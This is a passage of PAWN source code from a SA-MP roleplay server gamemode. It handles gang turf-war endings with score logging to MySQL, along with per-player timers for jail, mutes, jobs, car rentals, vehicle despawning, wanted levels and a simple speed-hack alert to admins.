					    if(PlayerInfo[j][pMember] == attackers || PlayerInfo[j][pMember] == defenders)
					    {
					    	SetPlayerVirtualWorld(j, 1024);
					    }
						if(IsPlayerInAnyVehicle(j))
						{
							if(PlayerInfo[j][pMember] == attackers || PlayerInfo[j][pMember] == defenders)
							{
								SendClientMessage(j, COLOR_SERVER, "You can not use war machines in area.");
								SetVehicleToRespawn(GetPlayerVehicleID(j));
							}
						}
					}
					if(PlayerInfo[j][pMember] == attackers || PlayerInfo[j][pMember] == defenders)
					{
						if(WarInfo[i][wAttacker] == 4)
						{
							GangZoneFlashForPlayer(j,Turfs[i], 0xCC000099);
						}
						else if(WarInfo[i][wAttacker] == 5)
						{
							GangZoneFlashForPlayer(j,Turfs[i], 0x66857399);
						}
						else if(WarInfo[i][wAttacker] == 6)
						{
							GangZoneFlashForPlayer(j,Turfs[i], 0x2F2F2F99);
						}
						else if(WarInfo[i][wAttacker] == 10)
						{
							GangZoneFlashForPlayer(j,Turfs[i], 0x88572499);
						}
					}
					if(IsPlayerInTurf(j, i))
					{
						if(PlayerInfo[j][pMember] == attackers)
						{
							count++;
						}
					}
				}
				if(count < 1)
				{
					if(waitwar[attackers] > 0)
					{
						waitwar[attackers]--;
					}
					if(waitwar[attackers] == 0)
					{
						waitwar[attackers] = 0;
						new atscore = 0,
							defscore = 0,
							winner;
						atscore = WarScoreF[attackers][i];
						defscore = WarScoreF[defenders][i];
						foreach(Player,j)
						{
							if(PlayerInfo[j][pMember] == attackers)
							{
								GangZoneStopFlashForPlayer(j,Turfs[i]);
							}
							if(PlayerInfo[j][pMember] == defenders)
							{
								GangZoneStopFlashForPlayer(j,Turfs[i]);
							}
						}
						if(atscore > defscore)
						{
							winner = 1;
						}
						else
						{
							winner = 2;
						}
						if(atscore == defscore)
						{
							winner = 2;
						}
						format(var100, sizeof(var100),"INSERT INTO `wars` (`Attacker`,`Defender`,`Atscore`,`Defscore`,`Result`) VALUES ('%d','%d','%d','%d','3')",attackers,defenders,atscore,defscore);
						mysql_query(SQL,var100);
						warid = mysql_insert_id();
						format(stringg,sizeof(stringg),"[WAR] %s failed to win turf %d owned by %s because they left the turf.",NumeFactiune(WarInfo[i][wAttacker]),i,NumeFactiune(WarInfo[i][wFaction]));
						SendFamilyMessage(attackers, COLOR_GREEN, stringg);
						SendFamilyMessage(defenders, COLOR_GREEN, stringg);
						format(stringg,sizeof(stringg),"------------ [ war overview #%d ] ------------", warid);
						SendFamilyMessage(attackers, COLOR_GREEN, stringg);
						SendFamilyMessage(defenders, COLOR_GREEN, stringg);
						if(winner == 1)
						{
							format(stringg,sizeof(stringg),"Score: %s %d - %d %s.",NumeFactiune(WarInfo[i][wAttacker]),atscore,defscore,NumeFactiune(WarInfo[i][wFaction]));
							SendFamilyMessage(attackers, COLOR_GREEN, stringg);
							SendFamilyMessage(defenders, COLOR_GREEN, stringg);
						}
						if(winner == 2)
						{
							format(stringg,sizeof(stringg),"Score: %s %d - %d %s.",NumeFactiune(WarInfo[i][wFaction]),defscore,atscore,NumeFactiune(WarInfo[i][wAttacker]));
							SendFamilyMessage(attackers, COLOR_GREEN, stringg);
							SendFamilyMessage(defenders, COLOR_GREEN, stringg);
						}
						new id = CalculateBestScore(i),
							id2 = CalculateWorstScore(i),
							bestnamee[30],
							worstnamee[30];
						GetPlayerName(id, bestnamee, sizeof(bestnamee));
						GetPlayerName(id2, worstnamee, sizeof(worstnamee));
						format(stringg,sizeof(stringg),"Best score: %s with a score of %d (%d kills, %d deaths). Worst score: %s with a score of %d (%d kills, %d deaths).", bestnamee, ucideri[id][i]-decese[id][i], ucideri[id][i], decese[id][i], worstnamee, ucideri[id2][i]-decese[id2][i], ucideri[id2][i], decese[id2][i]);
						SendFamilyMessage(attackers, COLOR_GREEN, stringg);
						SendFamilyMessage(defenders, COLOR_GREEN, stringg);
						foreach(Player, j)
						{
							if((PlayerInfo[j][pMember] == attackers) || (PlayerInfo[j][pMember] == defenders))
							{
								format(stringg,sizeof(stringg),"Your personal score: %d (%d kills, %d deaths).",ucideri[j][i]-decese[j][i],ucideri[j][i], decese[j][i]);
								SendClientMessage(j, COLOR_GREEN,stringg);
								for(new ix = 0; ix < sizeof(WarTD); ix++) { PlayerTextDrawHide(j, WarTD[ix]); }
								boxawar[j] = 0;
								for (new sss = 0; sss != 5; ++sss) SendDeathMessageToPlayer(j, 1001, 1001, 1001);
							}
						}
						SendFamilyMessage(attackers, COLOR_GREEN,"------------------------------------");
						SendFamilyMessage(defenders, COLOR_GREEN,"------------------------------------");
						WarScoreF[defenders][i] = 0;
						WarScoreF[attackers][i] = 0;
						InWar[attackers] = 0;
						InWar[defenders] = 0;
						foreach(Player, j)
						{
							if((PlayerInfo[j][pMember] == attackers) || (PlayerInfo[j][pMember] == defenders))
							{
								SendClientMessage(j, COLOR_YELLOW, "You were transferred in the normal Virtual World (0).");
								if(GetPlayerInterior(j) < 1)
								{
									SetPlayerVirtualWorld(j, 0);
								}
								if(attackers == 4 || defenders == 4)
								{
									for(new veh; veh < sizeof(Aztecasc); veh++)
									{
										SetVehicleVirtualWorld(Aztecasc[veh], 0);
									}
								}
								if(attackers == 5 || defenders == 5)
								{
									for(new veh; veh < sizeof(Grovec); veh++)
									{
										SetVehicleVirtualWorld(Grovec[veh], 0);
									}
								}
								if(attackers == 6 || defenders == 6)
								{
									for(new veh; veh < sizeof(Vagosc); veh++)
									{
										SetVehicleVirtualWorld(Vagosc[veh], 0);
									}
								}
								if(attackers == 10 || defenders == 10)
								{
									for(new veh; veh < sizeof(Ballasc); veh++)
									{
										SetVehicleVirtualWorld(Ballasc[veh], 0);
									}
								}
								mysql_format(SQL, var100, sizeof(var100),"INSERT INTO `warlogs` (`PlayerID`,`WarID`,`Kills`,`Deaths`,`Faction`) VALUES ('%d','%d','%d','%d','%d')",PlayerInfo[j][pSQLID],warid,ucideri[j][i],decese[j][i],PlayerInfo[j][pMember]);
								mysql_tquery(SQL,var100,"","");
								ucideri[j][i] = 0;
								decese[j][i] = 0;
							}
						}
						DeelayWar[WarInfo[i][wFaction]] = 600;
						DeelayWar[WarInfo[i][wAttacker]] = 600;
						WarInfo[i][wTime] = 0;
						WarInfo[i][wFaction] = 0;
						WarInfo[i][wAttacker] = 0;
						worstscoreat[i] = 0;
						worstmemberat[i] = 999;
						bestscoreat[i] = 0;
						bestmemberat[i] = 999;
						worstscoredf[i] = 0;
						worstmemberdf[i] = 999;
						bestscoredf[i] = 0;
						bestmemberdf[i] = 999;
					}
				}
				else
				{
					waitwar[attackers] = 60;
				}
			}
		}
	}
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
		    if(SafeTime[i] > 0)
			{
				SafeTime[i]--;
			}
			if(SafeTime[i] == 1)
			{
				if(gPlayerAccount[i] == 1 && gPlayerLogged[i] == 0)
				{
					ShowPlayerDialog(i,DIALOG_LOGIN2,DIALOG_STYLE_PASSWORD,"SERVER: Login","Welcome to the TopZone RPG Server.\n\nPlease enter your password below!","Login","Cancel");
				}
			}
			new newcar = GetPlayerVehicleID(i),
				level = PlayerInfo[i][pLevel];
			if(level >= 0 && level <= 2) { PlayerInfo[i][pPayCheck] += 2; }
			else if(level >= 3 && level <= 4) { PlayerInfo[i][pPayCheck] += 3; }
			else if(level >= 5 && level <= 6) { PlayerInfo[i][pPayCheck] += 4; }
			else if(level >= 7 && level <= 8) { PlayerInfo[i][pPayCheck] += 5; }
			else if(level >= 9 && level <= 10) { PlayerInfo[i][pPayCheck] += 6; }
			else if(level >= 11 && level <= 12) { PlayerInfo[i][pPayCheck] += 7; }
			else if(level >= 13 && level <= 14) { PlayerInfo[i][pPayCheck] += 8; }
			else if(level >= 15 && level <= 16) { PlayerInfo[i][pPayCheck] += 9; }
			else if(level >= 17 && level <= 18) { PlayerInfo[i][pPayCheck] += 10; }
			else if(level >= 19 && level <= 20) { PlayerInfo[i][pPayCheck] += 11; }
			else if(level >= 21) { PlayerInfo[i][pPayCheck] += 12; }
		    if(PlayerInfo[i][pJailed] > 0)
		    {
				if(PlayerInfo[i][pJailTime] > 0)
				{
				    if(gPlayerLogged[i] == 1)
				    {
						PlayerInfo[i][pJailTime]--;
						PlayerTextDrawShow(i, Jailtime[i]);
						new string3[60];
						format(string3,sizeof(string3),"Issued: ~r~%d MINUTE", PlayerInfo[i][pJailTime]/60+1);
						PlayerTextDrawSetString(i, Jailtime[i], string3);
					}
				}
				if(PlayerInfo[i][pJailTime] <= 0)
				{
				    PlayerInfo[i][pJailTime] = 0;
					if(PlayerInfo[i][pJailed] == 1)
					{
				    	SetPlayerInterior(i, 6);
		    			SetPlayerPosEx(i, 268.7461,76.8184,1001.0391);
					}
					if(PlayerInfo[i][pJailed] == 2)
					{
						SetPlayerInterior(i, 0);
						SetPlayerVirtualWorld(i, 0);
						new randomspawn = 1 + random(7);
				        if(randomspawn == 1 || randomspawn == 8)
				        {
				            SetPlayerPosEx(i, 364.0286,-2077.6917,7.8661);
				        }
				        if(randomspawn == 2 || randomspawn == 7)
				        {
				            SetPlayerPosEx(i, 375.0248,-2078.2959,7.8661);
				        }
				        if(randomspawn == 3 || randomspawn == 6)
				        {
				            SetPlayerPosEx(i, 384.9585,-2078.2041,7.8661);
				        }
				        if(randomspawn == 4 || randomspawn == 5 || randomspawn == 9)
				        {
				            SetPlayerPosEx(i, 394.1896,-2078.0164,7.8661);
				        }
					}
					PlayerInfo[i][pJailed] = 0;
					SendClientMessage(i, COLOR_SERVER, "Your time is up! You have been relased from jail/prison.");
					SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
			    	RemovePlayerAttachedObject(i,1);
					PlayerTextDrawHide(i, Jailtime[i]);
    				SetPlayerSkin(i, PlayerInfo[i][pModel]);
					ClearCrime(i);
					SetPlayerToTeamColor(i);
					TogglePlayerControllable(i, 1);
				}
			}
			if(RobTime[i] >= 0)
			{
				RobTime[i]++;
			}
			if(QuestWait[i] > 0)
			{
				QuestWait[i]--;
			}
			if(PlayerInfo[i][pNextNotification] > 0)
			{
			    PlayerInfo[i][pNextNotification]--;
			}
			if(pizzatime[i] > 0)
			{
			    pizzatime[i]--;
			    if(pizzatime[i] == 0)
			    {
			        SendClientMessage(i, COLOR_GREY, "Job reload time ended.");
			        pizzatime[i] = 0;
				}
			}
			if(DespawnCar[i][0] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[0][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][0] --;
					if(DespawnCar[i][0] == 0)
					{
						vehEngine[personalcar[0][i]] = 0;
						DestroyVehicle(personalcar[0][i]);
						OwnedVeh(personalcar[0][i]) = 0;
						Gas[personalcar[0][i]] = 100;
						personalcar[0][i] = 0;
						DespawnCar[i][0] = -1;
					}
				}	
			}
			if(DespawnCar[i][1] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[1][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][1] --;
					if(DespawnCar[i][1] == 0)
					{
						vehEngine[personalcar[1][i]] = 0;
						DestroyVehicle(personalcar[1][i]);
						OwnedVeh(personalcar[1][i]) = 0;
						Gas[personalcar[1][i]] = 100;
						personalcar[1][i] = 0;
						DespawnCar[i][1] = -1;
					}
				}	
			}
			if(DespawnCar[i][2] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[2][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][2] --;
					if(DespawnCar[i][2] == 0)
					{
						vehEngine[personalcar[2][i]] = 0;
						DestroyVehicle(personalcar[2][i]);
						OwnedVeh(personalcar[2][i]) = 0;
						Gas[personalcar[2][i]] = 100;
						personalcar[2][i] = 0;
						DespawnCar[i][2] = -1;
					}
				}	
			}
			if(DespawnCar[i][3] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[3][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][3] --;
					if(DespawnCar[i][3] == 0)
					{
						vehEngine[personalcar[3][i]] = 0;
						DestroyVehicle(personalcar[3][i]);
						OwnedVeh(personalcar[3][i]) = 0;
						Gas[personalcar[3][i]] = 100;
						personalcar[3][i] = 0;
						DespawnCar[i][3] = -1;
					}
				}	
			}
			if(DespawnCar[i][4] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[4][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][4] --;
					if(DespawnCar[i][4] == 0)
					{
						vehEngine[personalcar[4][i]] = 0;
						DestroyVehicle(personalcar[4][i]);
						OwnedVeh(personalcar[4][i]) = 0;
						Gas[personalcar[4][i]] = 100;
						personalcar[4][i] = 0;
						DespawnCar[i][4] = -1;
					}
				}	
			}
			if(DespawnCar[i][5] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[5][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][5] --;
					if(DespawnCar[i][5] == 0)
					{
						vehEngine[personalcar[5][i]] = 0;
						DestroyVehicle(personalcar[5][i]);
						OwnedVeh(personalcar[5][i]) = 0;
						Gas[personalcar[5][i]] = 100;
						personalcar[5][i] = 0;
						DespawnCar[i][5] = -1;
					}
				}	
			}
			if(DespawnCar[i][6] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[6][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][6] --;
					if(DespawnCar[i][6] == 0)
					{
						vehEngine[personalcar[6][i]] = 0;
						DestroyVehicle(personalcar[6][i]);
						OwnedVeh(personalcar[6][i]) = 0;
						Gas[personalcar[6][i]] = 100;
						personalcar[6][i] = 0;
						DespawnCar[i][6] = -1;
					}
				}	
			}
			if(DespawnCar[i][7] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[7][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][7] --;
					if(DespawnCar[i][7] == 0)
					{
						vehEngine[personalcar[7][i]] = 0;
						DestroyVehicle(personalcar[7][i]);
						OwnedVeh(personalcar[7][i]) = 0;
						Gas[personalcar[7][i]] = 100;
						personalcar[7][i] = 0;
						DespawnCar[i][7] = -1;
					}
				}	
			}
			if(DespawnCar[i][8] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[8][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][8] --;
					if(DespawnCar[i][8] == 0)
					{
						vehEngine[personalcar[8][i]] = 0;
						DestroyVehicle(personalcar[8][i]);
						OwnedVeh(personalcar[8][i]) = 0;
						Gas[personalcar[8][i]] = 100;
						personalcar[8][i] = 0;
						DespawnCar[i][8] = -1;
					}
				}	
			}
			if(DespawnCar[i][9] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[9][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][9] --;
					if(DespawnCar[i][9] == 0)
					{
						vehEngine[personalcar[9][i]] = 0;
						DestroyVehicle(personalcar[9][i]);
						OwnedVeh(personalcar[9][i]) = 0;
						Gas[personalcar[9][i]] = 100;
						personalcar[9][i] = 0;
						DespawnCar[i][9] = -1;
					}
				}	
			}
			if(DespawnCar[i][10] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[10][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][10] --;
					if(DespawnCar[i][10] == 0)
					{
						vehEngine[personalcar[10][i]] = 0;
						DestroyVehicle(personalcar[10][i]);
						OwnedVeh(personalcar[10][i]) = 0;
						Gas[personalcar[10][i]] = 100;
						personalcar[10][i] = 0;
						DespawnCar[i][10] = -1;
					}
				}	
			}
			if(DespawnCar[i][11] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[11][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][11] --;
					if(DespawnCar[i][11] == 0)
					{
						vehEngine[personalcar[11][i]] = 0;
						DestroyVehicle(personalcar[11][i]);
						OwnedVeh(personalcar[11][i]) = 0;
						Gas[personalcar[11][i]] = 100;
						personalcar[11][i] = 0;
						DespawnCar[i][11] = -1;
					}
				}	
			}
			if(DespawnCar[i][12] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[12][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][12] --;
					if(DespawnCar[i][12] == 0)
					{
						vehEngine[personalcar[12][i]] = 0;
						DestroyVehicle(personalcar[12][i]);
						OwnedVeh(personalcar[12][i]) = 0;
						Gas[personalcar[12][i]] = 100;
						personalcar[12][i] = 0;
						DespawnCar[i][12] = -1;
					}
				}	
			}
			if(DespawnCar[i][13] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[13][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][13] --;
					if(DespawnCar[i][13] == 0)
					{
						vehEngine[personalcar[13][i]] = 0;
						DestroyVehicle(personalcar[13][i]);
						OwnedVeh(personalcar[13][i]) = 0;
						Gas[personalcar[13][i]] = 100;
						personalcar[13][i] = 0;
						DespawnCar[i][13] = -1;
					}
				}	
			}
			if(DespawnCar[i][14] >= 1 && IsPlayerConnected(i))
			{
				new invehicul = 0;
				for(new x = 0; x < MAX_PLAYERS; x++) 
				{
					if(invehicul == 0)
					{
						if(IsPlayerConnected(x))
						{
							if(IsPlayerInVehicle(x,personalcar[14][i])) invehicul = 1;
						}
					}	
				}	
				if(invehicul == 0)
				{
					DespawnCar[i][14] --;
					if(DespawnCar[i][14] == 0)
					{
						vehEngine[personalcar[14][i]] = 0;
						DestroyVehicle(personalcar[14][i]);
						OwnedVeh(personalcar[14][i]) = 0;
						Gas[personalcar[14][i]] = 100;
						personalcar[14][i] = 0;
						DespawnCar[i][14] = -1;
					}
				}	
			}
			if(pockettime[i] > 0)
			{
			    pockettime[i]--;
			    if(pockettime[i] == 0)
			    {
			        SCM(i, COLOR_GREY,"Job reload time ended.");
			        pockettime[i] = 0;
			    }
			}
			if(failpizza[i] > 0)
			{
				failpizza[i]--;
				if(failpizza[i] == 0)
				{
					DisablePlayerRaceCheckpoint(i);
					pizzaj[i] = 0;
					pizzatime[i] = 0;
					failpizza[i] = -1;
					PizzaCP[i] = 0;
					pizzaprize[i] = 0;
				}
			}
			if(timerrent[i] > 0)
			{
                timerrent[i]--;
                if(timerrent[i] == 0)
                {
                    new engine,lights,alarm,doors,bonnet,boot,objective;
                    gCarLock[HireCar[i]] = 0;
                    GetVehicleParamsEx(HireCar[i],engine,lights,alarm,doors,bonnet,boot,objective);
                    SetVehicleParamsEx(HireCar[i],engine,lights,alarm,0,bonnet,boot,objective);
                    vehEngine[HireCar[i]] = 0;
                    GetVehicleParamsEx(HireCar[i],engine,lights,alarm,doors,bonnet,boot,objective);
					SetVehicleParamsEx(HireCar[i],VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
					HireCar[i] = -1;
					GameTextForPlayer(i, "~w~You no longer rent a car.", 5000, 3);
                    SetVehicleToRespawn(HireCar[i]);
                    timerrent[i] = 0;
				}
			}
			if(PlayerInfo[i][pSleeping] == 1)
			{
				SetPlayerHealthEx(i, 100);
			}
			if(JackAcc[i] > 0)
			{
				JackAcc[i]--;
				if(JackAcc[i] == 0) SCM(i,COLOR_SERVER,"You can now drop vehicles again at the crane.");
			}
			if(PlayerInfo[i][pAdmin] >= 1)
			{
				new reports=0,cheaters=0,strr[128];
				foreach(Player,id)
				{
					if(strcmp(reporttext[id], "NULL", true))
					{
						reports++;
					}
					if(reportcheater[id] != -1)
					{
						cheaters++;
					}
				}
				if(reports > 0)
				{
					PlayerTextDrawShow(i, Reportss[i]);
					format(strr,sizeof(strr),"REPORTS: ~r~%d~w~ / CHEATERS: ~r~%d",reports,cheaters);
					PlayerTextDrawSetString(i, Reportss[i], strr);
				}
				else if(reports == 0)
				{
					PlayerTextDrawHide(i, Reportss[i]);
				}
			}
			else
			{
				PlayerTextDrawHide(i, Reportss[i]);
			}
		    if(CellTime[i] > 0)
			{
				CellTime[i] = CellTime[i] +1;
				if(PlayerInfo[i][pCredits] > 0)
				{
					CallCost[i] = CallCost[i] +1;
				}
				else
				{
					new caller = Mobile[i];
				    CellTime[i] = 0;
				    CellTime[caller] = 0;
					CellTime[i] = 0;
					SendClientMessage(i,COLOR_SERVER,"{B8FFDB}You hung up because you don't have enough credits.");
					Mobile[caller] = -1;
				}
			}
			if(CellTime[i] == 0 && CallCost[i] > 0)
			{
				format(string, sizeof(string), "~w~The call cost~n~~r~~h~%d credits",CallCost[i]);
				PlayerInfo[i][pCredits] = PlayerInfo[i][pCredits] - CallCost[i];
				GameTextForPlayer(i, string, 5000, 1);
				Update(i, pCreditsx);
				CallCost[i] = 0;
			}
			if(PlayerInfo[i][pNewbieTimeout] > 0)
			{
	            PlayerInfo[i][pNewbieTimeout]--;
	        }
			if(timefornextquestion[i] > 0)
			{
			    timefornextquestion[i]--;
			    if(timefornextquestion[i] == 0)
			    {
			        timefornextquestion[i] = -1;
			    }
			}
	        if(PlayerInfo[i][pNMuted] > 0)
			{
	            PlayerInfo[i][pNMuted]--;
	            Update(i,pNMutedx);
	            if(PlayerInfo[i][pNMuted] == 0) SendClientMessage(i, COLOR_SERVER, "You may now speak in the newbie chat channel again.");
			}
			if(TransportTime[i] > 0)
			{
			    if(TransportTime[i] >= 16)
				{
					TransportTime[i] = 1;
					if(TransportDriver[i] < 999)
					{
						if(IsPlayerConnected(TransportDriver[i]))
						{
	      					TransportCost[i] += TransportValue[TransportDriver[i]];
						    TransportCost[TransportDriver[i]] = TransportCost[i];
						}
					}
				}
			    TransportTime[i] += 1;
			    format(string, sizeof(string), "~r~~h~%d ~w~: ~g~$%d",TransportTime[i],TransportCost[i]);
			    GameTextForPlayer(i, string, 15000, 6);
			}
			new idcar = GetPlayerVehicleID(i);
			if(GetPlayerState(i) == PLAYER_STATE_DRIVER && !IsAPlane(idcar))
			{
				new speed = Carspeed(i),
					antispeed[300],
					sendername[25];
				GetPlayerName(i,sendername,sizeof(sendername));
				if(speed > 222)
				{
					format(antispeed, sizeof(antispeed), "{0000ff}[Anti-Cheat]:{FFFFFF} %s (%d, level %d) may be using speed hack, vehicle: %s, speed: %.0d.",sendername,i,PlayerInfo[i][pLevel],aVehicleNames[GetVehicleModel(GetPlayerVehicleID(i))-400],speed);
        			ABroadCast(COLOR_RED,antispeed,1);
				}
			}
			if(PlayerInfo[i][pWantedLevel] > 0)
			{
			    wantedlost[i]--;
			    if(wantedlost[i] <= 0)
			    {
			        PlayerInfo[i][pWantedLevel] -= 1;
			        DestroyDynamic3DTextLabel(WantedScris[i]);
			        if(GetPlayerWantedLevel(i) > 0)
					{
					    Tigaanel[i] = 1;
						new str2[256];
    					format(str2,sizeof(str2),"{FF6600}Wanted Level: %d",PlayerInfo[i][pWantedLevel]);
    					UpdateDynamic3DTextLabelText(WantedScris[i], COLOR_SERVER, str2);
					}
			        new name[25];
			        GetPlayerName(i,name,sizeof(name));
			        SCM(i,COLOR_LIGHTBLUE,"You lost one wanted points because you ran 30 minutes by police.");
			        Update(i,pWantedLevelx);
					format(string,sizeof(string),"%s(%d) lost one wanted points because it ran 30 minutes by police.",name,i);
					SendTeamMessage(3, COLOR_DBLUE, string);
					SendTeamMessage(2, COLOR_DBLUE, string);
					SendTeamMessage(1, COLOR_DBLUE, string);
					SendTeamMessage(8, COLOR_DBLUE, string);
					SendTeamMessage(15, COLOR_DBLUE, string);
					wantedlost[i] = 1800;
					if(PlayerInfo[i][pWantedLevel] <= 0)
					{
					    ClearCrime(i);
					}
				}
			}
			if(PlayerInfo[i][pHitT] > 0)
			{
				PlayerInfo[i][pHitT] -= 1;
			}
		    if(RepairTime[i] > 0)
		    {
		        RepairTime[i] = RepairTime[i] - 1;
			}
			if(PlayerInfo[i][pMuted] > 0)
		    {
				if(PlayerInfo[i][pMuteTime] > 0)
				{
					PlayerInfo[i][pMuteTime]--;
				}
				if(PlayerInfo[i][pMuteTime] <= 0)
				{
				    PlayerInfo[i][pMuteTime] = 0;
                    SendClientMessage(i, COLOR_ERROR, "* Your time of silence has ended.");
					PlayerInfo[i][pMuted] = 0;
				}
			}
			if(targetfind[i] >= 0 && UsedFind[i] == 1)
   			{
   			    new target;
   			    target = targetfind[i];
   			    if(InBussines[target] > -1)
   			    {
					new j;
					j = InBussines[target];
					SetPlayerCheckpoint(i,BizzInfo[j][bEntranceX], BizzInfo[j][bEntranceY], BizzInfo[j][bEntranceZ],4);
				}
				else if(InHouse[target] > -1)
				{
					new j;
					j = InHouse[target];
					SetPlayerCheckpoint(i,HouseInfo[j][hEntrancex],HouseInfo[j][hEntrancey],HouseInfo[j][hEntrancez],4);
				}
				else if(InHQ[target] > -1)
				{
					SetPlayerCheckpoint(i,xhq[InHQ[target]],yhq[InHQ[target]],zhq[InHQ[target]],4);
				}
				else
				{
   			    	new Float: x, Float: y, Float: z;
   			    	GetPlayerPos(target,x,y,z);
   			    	SetPlayerCheckpoint(i,x,y,z,4);
   			    }
   			}
		    if(IsABoat(newcar))
			{
			    if(PlayerInfo[i][pBoatLic] < 1 && GetPlayerState(i) == 2 && TakingLesson[i] != 2)
				{
				    RemovePlayerFromVehicleEx(i);
				}
			}
			else if(IsAPlane(newcar))
			{
			    if(PlayerInfo[i][pFlyLic] < 1 && GetPlayerState(i) == 2)
				{
				    if(TakingLesson[i] == 1  || TakingLesson[i] == 2) { }
				    else { RemovePlayerFromVehicleEx(i); }
				}
			}
			else
			{
				if(PlayerInfo[i][pCarLic] < 1 && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == 2)
				{
					if(TakingLesson[i] == 1) { }
				}
			}//Done with car check
			if(TutTime[i] >= 1)
			{
			    TutTime[i] += 1;
			    if(TutTime[i] == 3)
				{
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
